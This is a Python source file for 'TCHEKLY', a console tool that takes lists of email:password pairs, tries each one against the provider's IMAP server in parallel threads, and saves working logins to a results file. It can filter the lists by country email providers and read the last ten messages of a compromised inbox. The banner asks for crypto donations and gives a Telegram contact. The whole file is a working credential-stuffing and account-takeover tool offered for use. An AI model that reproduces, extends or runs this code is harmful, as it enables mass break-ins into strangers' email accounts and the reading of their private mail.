import os
import sys
import time
import logging
import concurrent.futures
from datetime import datetime
from rich.console import Console
from rich.theme import Theme
from rich.panel import Panel
from rich.align import Align
from utils import (
    get_email_server,
    attempt_login,
    check_email_access,
    get_last_email,
    save_results,
    clean_email_list
)
import pyfiglet
import email
from email.header import decode_header
from email import message_from_bytes
from rich.progress import Progress
import smtplib
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup

def clean_html_content(html_content):
    """Clean HTML content and preserve links and formatting"""
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Replace <br>, <p>, <div> with newlines
    for tag in soup.find_all(['br', 'p', 'div']):
        tag.replace_with('\n' + tag.get_text() + '\n')
    
    # Handle links specially
    for link in soup.find_all('a'):
        href = link.get('href', '')
        text = link.get_text().strip()
        if href and text:
            if text in href:
                link.replace_with(f"\n→ {href}\n")
            else:
                link.replace_with(f"\n→ {text}: {href}\n")
    
    # Handle lists
    for ul in soup.find_all(['ul', 'ol']):
        for li in ul.find_all('li'):
            li.replace_with('\n• ' + li.get_text().strip())
        ul.replace_with('\n' + ul.get_text())
    
    # Get the text
    text = soup.get_text()
    
    # Clean up the text
    lines = []
    for line in text.split('\n'):
        line = line.strip()
        if line:
            lines.append(line)
    
    return '\n'.join(lines)

# Define all available themes
THEMES = {
    "ocean": Theme({
        "primary": "bold #0888AB",      # أزرق متوسط
        "primary_light": "bold #3CADD4", # أزرق فاتح
        "primary_dark": "bold #066688",  # أزرق غامق
        "success": "bold #08AB88",       # أخضر مائل للأزرق
        "error": "bold #AB0838",         # أحمر غامق
        "warning": "bold #AB6608",       # برتقالي
        "header": "bold #08ABAB",        # فيروزي
        "menu": "bold #3CD4AD",          # أخضر فاتح
        "highlight": "bold #08ABAB",     # فيروزي
        "info": "bold #3CADD4"           # أزرق فاتح
    }),
    
    "sunset": Theme({
        "primary": "bold #FF6B6B",       # أحمر وردي
        "primary_light": "bold #FFB088", # برتقالي فاتح
        "primary_dark": "bold #CC5555",  # أحمر غامق
        "success": "bold #4ECDC4",       # فيروزي
        "error": "bold #FF4949",         # أحمر
        "warning": "bold #FFB366",       # برتقالي
        "header": "bold #FF8787",        # وردي
        "menu": "bold #FFB088",          # برتقالي فاتح
        "highlight": "bold #FF8787",     # وردي
        "info": "bold #4ECDC4"           # فيروزي
    }),
    
    "forest": Theme({
        "primary": "bold #2D5A27",       # أخضر غامق
        "primary_light": "bold #4CAF50", # أخضر فاتح
        "primary_dark": "bold #1B4332",  # أخضر غامق جداً
        "success": "bold #76B947",       # أخضر ليموني
        "error": "bold #B33F40",         # أحمر
        "warning": "bold #CC9933",       # ذهبي
        "header": "bold #2E8B57",        # أخضر زمردي
        "menu": "bold #90EE90",          # أخضر فاتح
        "highlight": "bold #3CB371",     # أخضر متوسط
        "info": "bold #4CAF50"           # أخضر فاتح
    }),
    
    "cosmic": Theme({
        "primary": "bold #6B4EE6",       # بنفسجي
        "primary_light": "bold #9D84FF", # بنفسجي فاتح
        "primary_dark": "bold #4527A0",  # بنفسجي غامق
        "success": "bold #00BCD4",       # أزرق فاتح
        "error": "bold #FF5252",         # أحمر
        "warning": "bold #FFB300",       # ذهبي
        "header": "bold #7E57C2",        # بنفسجي متوسط
        "menu": "bold #B39DDB",          # بنفسجي فاتح
        "highlight": "bold #7E57C2",     # بنفسجي متوسط
        "info": "bold #00BCD4"           # أزرق فاتح
    }),
    
    "midnight": Theme({
        "primary": "bold #2C3E50",       # كحلي
        "primary_light": "bold #34495E", # كحلي فاتح
        "primary_dark": "bold #1A252F",  # كحلي غامق
        "success": "bold #27AE60",       # أخضر
        "error": "bold #E74C3C",         # أحمر
        "warning": "bold #F39C12",       # برتقالي
        "header": "bold #2980B9",        # أزرق
        "menu": "bold #3498DB",          # أزرق فاتح
        "highlight": "bold #2980B9",     # أزرق
        "info": "bold #3498DB"           # أزرق فاتح
    })
}

# Initialize with default theme
current_theme = "cosmic"
console = Console(theme=THEMES[current_theme])

def change_theme(theme_name):
    """Change the current theme"""
    global console, current_theme
    if theme_name in THEMES:
        current_theme = theme_name
        console = Console(theme=THEMES[theme_name])
        return True
    return False

# Setup logging
if not os.path.exists('logs'):
    os.makedirs('logs')
logging.basicConfig(
    filename='logs/email_checker.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def print_banner():
    """Print the program banner"""
    console.clear()
    
    # Create simple banner
    banner = pyfiglet.figlet_format("TCHEKLY", font="slant")
    console.print(banner, style="primary")
    
    # Print menu in a simple grid
    console.print("\n" + "="*30 + " MENU " + "="*30, style="primary")
    console.print("1. Clean Email List     2. Check Emails        3. Read Last Emails", style="primary")
    console.print("4. SMTP Settings        5. Change Theme        6. Exit", style="primary")
    console.print("="*67, style="primary")
    
    # Print support info
    console.print("\nSupport & Contact:", style="primary")
    console.print("──────────────────", style="primary")
    console.print("DONATE USDT (TRC20): TNALbyDAw8T4EMEHaQ7RAPC5LpAvLQJ3qK", style="primary")
    console.print("REGESTER TO REDOTPAY CRYPTO Card: https://url.hk/i/en/9hdk3", style="primary")
    console.print("Developer: ramflow | Telegram: t.me/blackyhaty| Version: 1.0", style="primary")
    
    # Print input prompt
    console.print("\nEnter your choice (1-6): ", style="primary", end="")

def display_menu():
    """Display main menu and get user choice"""
    while True:
        print_banner()
        choice = input("\n[>] Choice (1-6): ")
        
        if choice == '1':
            file_path = input("\n[>] Email list path: ")
            clean_email_list(file_path)
        elif choice == '2':
            check_emails_menu()
        elif choice == '3':
            email = input("\n[>] Email: ")
            password = input("[>] Password: ")
            read_last_ten_emails(email, password)
        elif choice == '4':
            email = input("\n[>] Email: ")
            detect_smtp_settings(email)
        elif choice == '5':
            change_theme_menu()
        elif choice == '6':
            console.print("\nThanks for using TCHEKLY!", style="success")
            break
        else:
            console.print("\nInvalid choice!", style="error")
            time.sleep(1)
            continue
            
        if not prompt_continue():
            break

def change_theme_menu():
    """Display theme selection menu"""
    while True:
        console.clear()
        console.print("\n=== Theme Selection ===", style="header")
        console.print(f"\nCurrent Theme: {current_theme}", style="primary")
        console.print("\nAvailable Themes:", style="primary")
        
        for i, theme in enumerate(THEMES.keys(), 1):
            if theme == current_theme:
                console.print(f"[{i}] {theme} (Current)", style="highlight")
            else:
                console.print(f"[{i}] {theme}", style="menu")
        
        console.print("\n[0] Back to Main Menu", style="menu")
        
        choice = input("\n[>] Choose a theme (0-5): ")
        
        if choice == '0':
            break
        elif choice.isdigit() and 1 <= int(choice) <= len(THEMES):
            new_theme = list(THEMES.keys())[int(choice)-1]
            if change_theme(new_theme):
                console.print(f"\nTheme changed to {new_theme}!", style="success")
                time.sleep(1)
                break
        else:
            console.print("\nInvalid choice. Please try again.", style="error")
            time.sleep(1)

def clean_list_only():
    """Clean email list without checking emails"""
    emails_file = input("Enter name of text file containing emails: ")
    console.print("\nCleaning email list...", style="info")
    cleaned_file = clean_email_list(emails_file)
    if not cleaned_file:
        console.print("Failed to clean list. Please check the file and try again.", style="error")
    else:
        console.print("List cleaning completed. You can find the cleaned list in the same file.", style="success")
    if not prompt_continue():
        return

def parse_country_codes(country_input):
    """Parse and clean country code input"""
    # Split by both comma and space, and clean each code
    countries = []
    for country in country_input.replace(',', ' ').split():
        country = country.strip().upper()
        if country:
            countries.append(country)
    return countries

def check_emails_menu():
    """Display check emails submenu"""
    while True:
        console.clear()
        # Print banner
        banner = pyfiglet.figlet_format("EMAIL CHECK", font="slant")
        console.print(banner, style="primary")
        
        # Print submenu
        console.print("\n" + "="*30 + " CHECK OPTIONS " + "="*30, style="primary")
        console.print("1. Check All Emails", style="primary")
        console.print("2. Check Emails by Country", style="primary")
        console.print("3. Back to Main Menu", style="primary")
        console.print("="*76, style="primary")
        
        choice = input("\nEnter your choice (1-3): ")
        
        if choice == '1':
            file_path = input("\nEnter email list path: ")
            check_emails(file_path)
            if not prompt_continue():
                break
        elif choice == '2':
            file_path = input("\nEnter email list path: ")
            console.print("\nEnter country code(s):", style="info")
            console.print("Examples: FR US PL or fr,us,pl or FR,US PL", style="primary_light")
            country_input = input("> ")
            
            countries = parse_country_codes(country_input)
            if not countries:
                console.print("\nNo valid country codes entered!", style="error")
                time.sleep(1)
                continue
            
            try:
                # Read emails once
                with open(file_path, 'r') as file:
                    all_emails = [line.strip() for line in file.readlines()]
                
                # Process each country and collect emails
                all_country_emails = []
                
                for country in countries:
                    console.print(f"\n[bold]Processing {country}...[/bold]", style="info")
                    country_emails = check_emails_by_country(file_path, country, all_emails)
                    all_country_emails.extend(country_emails)
                
                # Remove duplicates while preserving order
                unique_emails = list(dict.fromkeys(all_country_emails))
                
                if unique_emails:
                    console.print(f"\n[bold]Total Summary:[/bold]", style="info")
                    console.print(f"Total unique emails found: {len(unique_emails)}", style="success")
                    console.print("\nChecking all found emails...", style="info")
                    check_emails(file_path, unique_emails)
                
            except FileNotFoundError:
                console.print("\nFile not found!", style="error")
            except Exception as e:
                console.print(f"\nError: {str(e)}", style="error")
                
        elif choice == '3':
            break
        else:
            console.print("\nInvalid choice!", style="error")
            time.sleep(1)
            continue
            
        if not prompt_continue():
            break

def get_country_email_patterns(country_code):
    """Get email patterns for a specific country"""
    country_patterns = {
        'PL': [
            '.pl',  # Polish TLD
            'wp.pl', 'onet.pl', 'interia.pl', 'o2.pl', 'gazeta.pl',  # Popular Polish providers
            'poczta.pl', 'tlen.pl', 'op.pl', 'vp.pl', 'autograf.pl'
        ],
        'FR': [
            '.fr',  # French TLD
            'laposte.net', 'orange.fr', 'sfr.fr', 'free.fr', 'wanadoo.fr',
            'bbox.fr', 'numericable.fr', 'neuf.fr', 'club-internet.fr'
        ],
        'DE': [
            '.de',  # German TLD
            'web.de', 'gmx.de', 't-online.de', 'freenet.de', 'yahoo.de',
            'vodafone.de', 'mail.de', 'posteo.de'
        ],
        'IT': [
            '.it',  # Italian TLD
            'libero.it', 'virgilio.it', 'tim.it', 'alice.it', 'tin.it',
            'poste.it', 'tiscali.it', 'fastwebnet.it'
        ],
        'ES': [
            '.es',  # Spanish TLD
            'telefonica.es', 'movistar.es', 'orange.es', 'vodafone.es',
            'jazztel.es', 'ono.es', 'ya.com'
        ],
        # Add more countries as needed
    }
    
    # Default patterns for unknown country codes
    default_patterns = [f'.{country_code.lower()}']
    
    return country_patterns.get(country_code.upper(), default_patterns)

def check_emails_by_country(file_path, country_code, shared_emails=None):
    """Check emails for a specific country"""
    try:
        # Use shared emails list if provided, otherwise read from file
        emails = shared_emails if shared_emails is not None else []
        if not emails:
            with open(file_path, 'r') as file:
                emails = [line.strip() for line in file.readlines()]
        
        # Get country-specific patterns
        patterns = get_country_email_patterns(country_code)
        
        # Filter emails by country patterns
        country_emails = []
        for email in emails:
            email = email.strip().lower()
            if any(pattern.lower() in email for pattern in patterns):
                country_emails.append(email)
        
        if not country_emails:
            console.print(f"\nNo emails found for country: {country_code}", style="warning")
            console.print("Supported email providers:", style="info")
            for pattern in patterns:
                console.print(f"  • *{pattern}", style="primary")
            return []
        
        console.print(f"\nFound {len(country_emails)} emails for {country_code}:", style="success")
        for pattern in patterns:
            count = sum(1 for email in country_emails if pattern.lower() in email.lower())
            if count > 0:
                console.print(f"  • *{pattern}: {count} emails", style="primary")
        
        return country_emails
        
    except Exception as e:
        console.print(f"\nError: {str(e)}", style="error")
        return []

def read_last_ten_emails(email_address, password):
    """Read the last 10 emails from an account and let user select one to read"""
    try:
        server = get_email_server(email_address)
        success, imap_server = attempt_login(email_address, password, server)
        
        if not success or not imap_server:
            console.print("[✗] Failed to login to email account.", style="error")
            return
            
        try:
            imap_server.select('INBOX', readonly=True)
            _, message_numbers = imap_server.search(None, 'ALL')
            
            # Get all message IDs and take the last 10
            message_ids = message_numbers[0].split()
            last_ten = message_ids[-10:] if len(message_ids) >= 10 else message_ids
            last_ten.reverse()  # Reverse to show newest first
            
            emails = []
            for i, msg_id in enumerate(last_ten, 1):
                _, msg_data = imap_server.fetch(msg_id, '(RFC822)')
                email_body = msg_data[0][1]
                email_message = email.message_from_bytes(email_body)
                
                # Get subject
                subject = decode_header(email_message["subject"])[0][0]
                if isinstance(subject, bytes):
                    subject = subject.decode()
                    
                # Get sender
                from_header = decode_header(email_message["from"])[0][0]
                if isinstance(from_header, bytes):
                    from_header = from_header.decode()
                    
                # Get date
                date = email_message["date"]
                
                # Get body
                body = ""
                if email_message.is_multipart():
                    for part in email_message.walk():
                        if part.get_content_type() in ["text/plain", "text/html"]:
                            try:
                                content = part.get_payload(decode=True).decode()
                                if part.get_content_type() == "text/html":
                                    content = clean_html_content(content)
                                body = content
                                break
                            except:
                                continue
                else:
                    content = email_message.get_payload(decode=True).decode()
                    if email_message.get_content_type() == "text/html":
                        content = clean_html_content(content)
                    body = content
                
                emails.append({
                    'id': i,
                    'subject': subject,
                    'from': from_header,
                    'date': date,
                    'body': body.strip(),
                    'msg_id': msg_id
                })
            
            if not emails:
                console.print("[!] No emails found in inbox.", style="warning")
                return
                
            # Display emails
            console.print("\nLast 10 emails:", style="info")
            for email_info in emails:
                console.print(f"\n[{email_info['id']}] From: {email_info['from']}", style="primary")
                console.print(f"    Subject: {email_info['subject']}", style="primary_light")
                console.print(f"    Date: {email_info['date']}", style="primary_light")
            
            # Let user select an email to read
            while True:
                try:
                    choice = input("\nEnter email number to read (or 'q' to quit): ")
                    if choice.lower() == 'q':
                        break
                        
                    choice = int(choice)
                    if 1 <= choice <= len(emails):
                        selected = emails[choice - 1]
                        console.print("\n" + "="*50, style="primary")
                        console.print(f"From: {selected['from']}", style="primary")
                        console.print(f"Subject: {selected['subject']}", style="primary")
                        console.print(f"Date: {selected['date']}", style="primary")
                        console.print("="*50, style="primary")
                        console.print("\nBody:", style="primary")
                        
                        # Split body into lines and print each line
                        for line in selected['body'].split('\n'):
                            if line.startswith('→'):  # Links
                                console.print(line, style="info")
                            elif line.startswith('•'):  # List items
                                console.print(line, style="warning")
                            else:  # Normal text
                                console.print(line, style="primary_light")
                                
                        console.print("\n" + "="*50, style="primary")
                    else:
                        console.print("Invalid email number.", style="error")
                except ValueError:
                    console.print("Please enter a valid number.", style="error")
                    
        finally:
            imap_server.close()
            imap_server.logout()
            
    except Exception as e:
        console.print(f"[✗] Error reading emails: {str(e)}", style="error")
        logging.error(f"Error reading emails: {str(e)}")

def process_single_email(email_line):
    """Process a single email"""
    try:
        email_address, password = email_line.strip().split(':')
        server = get_email_server(email_address)
        
        if not server:
            console.print(f"[✗] {email_address}:{password} | Unknown email provider", style="error")
            return False
            
        success, imap_server = attempt_login(email_address, password, server)
        
        if success and imap_server:
            if check_email_access(imap_server):
                console.print(f"[✓] {email_address}:{password} | Login successful", style="success")
                save_results(email_address, password)
                imap_server.logout()
                return True
            else:
                console.print(f"[✗] {email_address}:{password} | Login successful but no inbox access", style="error")
                imap_server.logout()
                return False
        else:
            console.print(f"[✗] {email_address}:{password} | Login failed", style="error")
            return False
            
    except Exception as e:
        console.print(f"[✗] Error processing email line: {str(e)}", style="error")
        return False

def check_emails(emails_file, emails=None):
    """Check emails using parallel processing"""
    # First clean and deduplicate the email list
    if not clean_email_list(emails_file):
        return
    
    if emails is None:
        with open(emails_file, 'r') as f:
            email_lines = [line.strip() for line in f.readlines() if line.strip()]
    else:
        email_lines = emails
    
    total_emails = len(email_lines)
    
    if total_emails == 0:
        console.print("No emails found in the file.", style="error")
        return
        
    console.print(f"\nStarting to check {total_emails} unique emails...", style="info")
    
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            # Create list to store futures
            futures = []
            
            # Submit all email checking tasks
            for email_line in email_lines:
                future = executor.submit(process_single_email, email_line)
                futures.append(future)
            
            # Process completed tasks
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    console.print(f"Error processing email: {str(e)}", style="error")
                
    except KeyboardInterrupt:
        console.print("\nStopping email check... Please wait.", style="warning")
        return
    finally:
        console.print("\nEmail check completed.", style="info")
    if not prompt_continue():
        return

def save_results(email_address, password):
    """Save search results to appropriate files"""
    try:
        # Create results directory if it doesn't exist
        for dir_name in ['results/good_emails']:
            if not os.path.exists(dir_name):
                os.makedirs(dir_name)
        
        # Save to valid emails file
        valid_emails_file = 'results/good_emails/valid_emails.txt'
        with open(valid_emails_file, 'a') as f:
            f.write(f"{email_address}:{password}\n")
        
        logging.info(f"Results saved for {email_address}")
        
    except Exception as e:
        logging.error(f"Error saving results for {email_address}: {str(e)}")

def test_smtp_connection(server, port, timeout=5):
    """Test if SMTP server is accessible"""
    try:
        smtp = smtplib.SMTP(server, port, timeout=timeout)
        smtp.ehlo()
        try:
            smtp.starttls()
        except:
            pass
        smtp.quit()
        return True
    except (socket.timeout, socket.gaierror, smtplib.SMTPException):
        return False

def get_webmail_link(email):
    """Get webmail login link for email provider"""
    domain = email.split('@')[-1].lower()
    
    webmail_links = {
        'gmail.com': 'https://gmail.com',
        'yahoo.com': 'https://mail.yahoo.com',
        'yahoo.co.uk': 'https://mail.yahoo.com',
        'yahoo.co.jp': 'https://mail.yahoo.com',
        'hotmail.com': 'https://outlook.live.com',
        'outlook.com': 'https://outlook.live.com',
        'live.com': 'https://outlook.live.com',
        'office365.com': 'https://outlook.office365.com',
        'aol.com': 'https://mail.aol.com',
        'mail.com': 'https://www.mail.com/mail/login',
        'zoho.com': 'https://mail.zoho.com',
        'protonmail.com': 'https://mail.proton.me',
        'icloud.com': 'https://www.icloud.com/mail'
    }
    
    if domain in webmail_links:
        return webmail_links[domain]
    else:
        # Try to guess webmail link for custom domains
        common_webmail_patterns = [
            f'https://webmail.{domain}',
            f'https://mail.{domain}',
            f'https://outlook.{domain}',
            f'https://owa.{domain}'
        ]
        return common_webmail_patterns

def detect_smtp_settings(email):
    """Detect SMTP settings for an email address"""
    try:
        domain = email.split('@')[-1].lower()
        
        # Common SMTP settings for popular email providers
        smtp_settings = {
            'gmail.com': {
                'smtp': 'smtp.gmail.com',
                'imap': 'imap.gmail.com',
                'smtp_port': 587,
                'imap_port': 993,
                'requires_ssl': True
            },
            'yahoo.com': {
                'smtp': 'smtp.mail.yahoo.com',
                'imap': 'imap.mail.yahoo.com',
                'smtp_port': 587,
                'imap_port': 993,
                'requires_ssl': True
            },
            'hotmail.com': {
                'smtp': 'smtp.office365.com',
                'imap': 'outlook.office365.com',
                'smtp_port': 587,
                'imap_port': 993,
                'requires_ssl': True
            },
            'outlook.com': {
                'smtp': 'smtp.office365.com',
                'imap': 'outlook.office365.com',
                'smtp_port': 587,
                'imap_port': 993,
                'requires_ssl': True
            },
            'live.com': {
                'smtp': 'smtp.office365.com',
                'imap': 'outlook.office365.com',
                'smtp_port': 587,
                'imap_port': 993,
                'requires_ssl': True
            }
        }
        
        console.print(f"\nDetecting settings for {email}...", style="info")
        
        # Get webmail link
        webmail_link = get_webmail_link(email)
        console.print("\n[bold]Webmail Access:[/]", style="primary")
        if isinstance(webmail_link, str):
            console.print(f"→ Login URL: {webmail_link}", style="success")
        else:
            console.print("Possible webmail URLs for your domain:", style="info")
            for link in webmail_link:
                console.print(f"→ {link}", style="primary_light")
        
        # Get SMTP/IMAP settings
        settings = smtp_settings.get(domain)
        if settings:
            console.print("\n[bold]Email Server Settings:[/]", style="primary")
            console.print(f"\nSMTP Server:", style="info")
            console.print(f"• Server: {settings['smtp']}", style="primary_light")
            console.print(f"• Port: {settings['smtp_port']}", style="primary_light")
            console.print(f"• SSL/TLS: {'Required' if settings['requires_ssl'] else 'Optional'}", style="primary_light")
            
            console.print(f"\nIMAP Server:", style="info")
            console.print(f"• Server: {settings['imap']}", style="primary_light")
            console.print(f"• Port: {settings['imap_port']}", style="primary_light")
            console.print(f"• SSL/TLS: {'Required' if settings['requires_ssl'] else 'Optional'}", style="primary_light")
        else:
            # Try to guess settings for custom domains
            guessed_smtp = f"smtp.{domain}"
            guessed_imap = f"imap.{domain}"
            
            console.print("\n[bold]Possible Email Server Settings:[/]", style="primary")
            console.print(f"\nSMTP Server:", style="info")
            console.print(f"• Server: {guessed_smtp}", style="primary_light")
            console.print("• Common Ports: 25, 465, 587", style="primary_light")
            
            console.print(f"\nIMAP Server:", style="info")
            console.print(f"• Server: {guessed_imap}", style="primary_light")
            console.print("• Common Ports: 143, 993", style="primary_light")
            
            console.print("\n[italic]Note: These are guessed settings. Please verify with your email provider.[/]", style="warning")
        
    except Exception as e:
        console.print(f"[✗] Error detecting settings: {str(e)}", style="error")

def prompt_continue():
    """Ask user if they want to continue to main menu"""
    while True:
        choice = input("\n[>] Return to main menu? (y/n): ").lower()
        if choice in ['y', 'yes']:
            return True
        elif choice in ['n', 'no']:
            console.print("\nThank you for using TCHEKLY!", style="success")
            return False
        else:
            console.print("Invalid choice. Please enter 'y' or 'n'.", style="error")

def main():
    """Main program loop"""
    try:
        while True:
            display_menu()
            if not prompt_continue():
                break
                
    except KeyboardInterrupt:
        console.print("\nProcess interrupted by user", style="warning")
    except Exception as e:
        console.print(f"\nAn unexpected error occurred: {str(e)}", style="error")
        logging.error(f"Unexpected error: {str(e)}")

if __name__ == "__main__":
    main()

def clean_email_list(emails_file):
    """Clean and deduplicate email list"""
    try:
        # Read all lines from file
        with open(emails_file, 'r') as f:
            lines = f.readlines()
        
        original_count = len(lines)
        invalid_count = 0
        
        # Set to store unique emails
        unique_emails = set()
        valid_format_emails = []
        
        for line in lines:
            line = line.strip()
            if not line:  # Skip empty lines
                invalid_count += 1
                continue
                
            # Try to split and format the email:pass
            try:
                email, password = line.split(':', 1)  # Split only on first colon
                email = email.strip().lower()  # Convert to lowercase for deduplication
                password = password.strip()
                
                # Create the standard format email:pass
                email_pass = f"{email}:{password}"
                
                # Only add if this email hasn't been seen before
                if email not in unique_emails:
                    unique_emails.add(email)
                    valid_format_emails.append(email_pass)
            except ValueError:
                invalid_count += 1
                continue
        
        # Write the cleaned list back to the file
        with open(emails_file, 'w') as f:
            for email_pass in valid_format_emails:
                f.write(f"{email_pass}\n")
        
        console.print(f"[✓] List cleaned successfully!", style="success")
        console.print(f"- Found {len(valid_format_emails)} valid emails", style="info")
        console.print(f"- Removed {invalid_count} invalid lines", style="info")
        
        return True
        
    except Exception as e:
        logging.error(f"Error cleaning email list: {str(e)}")
        console.print(f"[✗] Error cleaning list: {str(e)}", style="error")
        return False
